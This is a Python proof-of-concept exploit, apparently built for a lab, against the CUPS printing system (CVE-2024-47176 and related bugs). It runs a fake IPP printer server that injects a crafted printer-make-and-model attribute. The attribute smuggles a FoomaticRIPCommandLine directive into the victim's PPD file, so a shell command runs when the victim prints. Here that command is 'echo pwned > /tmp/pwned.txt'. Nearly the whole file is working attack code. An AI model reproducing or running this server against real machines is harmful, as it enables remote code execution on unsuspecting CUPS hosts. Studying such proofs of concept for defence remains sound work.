import socket
import struct
import threading

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

CLIENT_IP = get_local_ip()
CLIENT_PORT = 631
PRINTER_NAME = "FAKE_PRINTER"

print(f"[*] Detected local IP: {CLIENT_IP}")


# Minimal IPP response advertising our printer
# This is where CVE-2024-47075/47175 comes in --
# these attributes get written into the PPD unsanitized
def build_empty_response(request_id=1):
    """Minimal valid IPP response for unsupported attribute requests"""
    header = struct.pack(">BBHI", 1, 1, 0x0000, request_id)
    
    def attr(tag, name, value):
        name_bytes = name.encode()
        value_bytes = value.encode()
        return (
            struct.pack(">B", tag) +
            struct.pack(">H", len(name_bytes)) +
            name_bytes +
            struct.pack(">H", len(value_bytes)) +
            value_bytes
        )
    
    attrs = b"\x01"                                         # operation-attributes-tag
    attrs += attr(0x47, "attributes-charset", "utf-8")
    attrs += attr(0x48, "attributes-natural-language", "en-us")
    attrs += b"\x04"                                         # printer-attributes-tag (empty group)
    attrs += b"\x03"                                         # end-of-attributes-tag

    return header + attrs

def build_ipp_response(request_id=1):

    def attr_enum(tag, name, value):
        name_bytes = name.encode()
        return (
            struct.pack(">B", tag) +
            struct.pack(">H", len(name_bytes)) +
            name_bytes +
            struct.pack(">H", 4) +
            struct.pack(">I", value)
        )

    def attr(tag, name, value):
        name_bytes = name.encode()
        value_bytes = value.encode()
        return (
            struct.pack(">B", tag) +
            struct.pack(">H", len(name_bytes)) +
            name_bytes +
            struct.pack(">H", len(value_bytes)) +
            value_bytes
        )

    def attr_int(tag, name, value):
        name_bytes = name.encode()
        return (
            struct.pack(">B", tag) +
            struct.pack(">H", len(name_bytes)) +
            name_bytes +
            struct.pack(">H", 4) +
            struct.pack(">I", value)
        )

    def attr_bool(tag, name, value):
        name_bytes = name.encode()
        return (
            struct.pack(">B", tag) +
            struct.pack(">H", len(name_bytes)) +
            name_bytes +
            struct.pack(">H", 1) +
            struct.pack(">B", 1 if value else 0)
        )

    # IPP version 2.0 (2, 0), status OK (0x0000)
    header = struct.pack(">BBHI", 2, 0, 0x0000, request_id)

    # Operation attributes group
    attrs = b"\x01"
    attrs += attr(0x47, "attributes-charset", "utf-8")
    attrs += attr(0x48, "attributes-natural-language", "en-us")

    # Printer attributes group
    attrs += b"\x04"

    # URI attributes (tag 0x45 = uri)
    attrs += attr(0x45, "printer-uri-supported", f"ipp://{CLIENT_IP}:{CLIENT_PORT}/printers/{PRINTER_NAME}")

    # Keyword attributes (tag 0x44)
    attrs += attr(0x44, "uri-security-supported", "none")
    attrs += attr(0x44, "uri-authentication-supported", "none")
    attrs += attr(0x44, "ipp-versions-supported", "2.0")
    attrs += attr(0x44, "operations-supported", "Print-Job")
    attrs += attr(0x44, "charset-configured", "utf-8")
    attrs += attr(0x44, "charset-supported", "utf-8")
    attrs += attr(0x44, "natural-language-configured", "en-us")
    
    # IPP Everywhere Mandatory Formats
    attrs += attr(0x44, "document-format-default", "application/pdf")
    attrs += attr(0x44, "document-format-supported", "application/pdf")
    attrs += attr(0x44, "document-format-supported", "image/urf")
    attrs += attr(0x44, "document-format-supported", "application/octet-stream")
    attrs += attr(0x44, "pwg-raster-document-resolution-supported", "300dpi")
    attrs += attr(0x44, "urf-supported", "W8,SRGB24")

    attrs += attr(0x44, "pdl-override-supported", "not-attempted")
    attrs += attr(0x44, "compression-supported", "none")

    # Name attributes (tag 0x42)
    attrs += attr(0x42, "printer-name", PRINTER_NAME)

    # Text attributes (tag 0x41)
    attrs += attr(0x41, "printer-location", "Lab Network")
    attrs += attr(0x41, "printer-info", "CVE-2024-47176 PoC Printer")
    
    # THIS IS THE KEY INJECTION - Notice the closed quote after EVL
    #attrs += attr(0x41, "printer-make-and-model",
    #              'EVL"\n*FoomaticRIPCommandLine: "echo pwned > /tmp/pwned.txt')

    #attrs += attr(0x41, "printer-make-and-model", "HP LaserJet Pro")

    payload_bytes = b'EVL"\n*FoomaticRIPCommandLine: "echo pwned > /tmp/pwned.txt"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'
    
    # We must manually pack this attribute since we are using raw bytes instead of strings
    name_bytes = b"printer-make-and-model"
    attrs += (
        struct.pack(">B", 0x41) +               # Tag: textWithoutLanguage
        struct.pack(">H", len(name_bytes)) +    # Name length
        name_bytes +                            # Name string
        struct.pack(">H", len(payload_bytes)) + # Value length
        payload_bytes                           # Raw payload bytes
    )

    # Integer attributes (tag 0x21)
    attrs += attr_int(0x21, "printer-state", 3)
    attrs += attr_int(0x21, "queued-job-count", 0)
    attrs += attr_int(0x21, "printer-up-time", 1000)
    
    # Boolean attributes (tag 0x22)
    attrs += attr_bool(0x22, "printer-is-accepting-jobs", True)
    attrs += attr_bool(0x22, "color-supported", False)

    # End of attributes
    attrs += b"\x03"

    return header + attrs

def handle_client(conn, addr):
    print(f"[+] Incoming connection from {addr[0]}:{addr[1]}")
    conn.settimeout(5.0) # Prevent hanging on dead connections
    buffer = b""         # Use a persistent buffer to handle pipelining
    
    try:
        while True:
            # 1. Read until we have a complete HTTP header
            while b"\r\n\r\n" not in buffer:
                try:
                    chunk = conn.recv(4096)
                    if not chunk: break
                    buffer += chunk
                except socket.timeout:
                    break

            if not buffer or b"\r\n\r\n" not in buffer:
                break

            # 2. Split exactly at the end of the FIRST header
            header_end = buffer.find(b"\r\n\r\n") + 4
            headers = buffer[:header_end]
            buffer = buffer[header_end:] # Keep pipelined data in the buffer!

            # Handle Expect: 100-continue
            if b"100-continue" in headers.lower():
                conn.sendall(b"HTTP/1.1 100 Continue\r\n\r\n")

            # Parse Content-Length
            content_length = 0
            for line in headers.lower().split(b"\r\n"):
                if line.startswith(b"content-length:"):
                    content_length = int(line.split(b":")[1].strip())

            # 3. Read until we have the complete IPP body for THIS request
            while len(buffer) < content_length:
                try:
                    chunk = conn.recv(4096)
                    if not chunk: break
                    buffer += chunk
                except socket.timeout:
                    break

            if len(buffer) < content_length:
                break

            # Extract the exact body, leave the rest in the buffer for the next loop
            body = buffer[:content_length]
            buffer = buffer[content_length:] 

            # Extract request ID
            request_id = 1
            if len(body) >= 8:
                request_id = int.from_bytes(body[4:8], 'big')

            print(f"[*] Standard get-printer-attributes - sending full response for ID {request_id}")
            ipp_body = build_ipp_response(request_id)

            content_length_header = f"Content-Length: {len(ipp_body)}\r\n".encode()
            
            # Send Keep-Alive response
            http_response = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/ipp\r\n"
                b"Connection: keep-alive\r\n" +
                content_length_header +
                b"\r\n" +
                ipp_body
            )
            conn.sendall(http_response)
            print(f"[+] Response sent for request_id={request_id}")

    except Exception as e:
        print(f"[-] Connection error: {e}")
    finally:
        conn.close()

def start_ipp_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((CLIENT_IP, CLIENT_PORT))
    server.listen(6)

    print(f"[*] Fake IPP server listening on port {CLIENT_PORT}")
    print(f"[*] Waiting for Pi to connect back...")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.daemon = True
        thread.start()

if __name__ == "__main__":
    start_ipp_server()
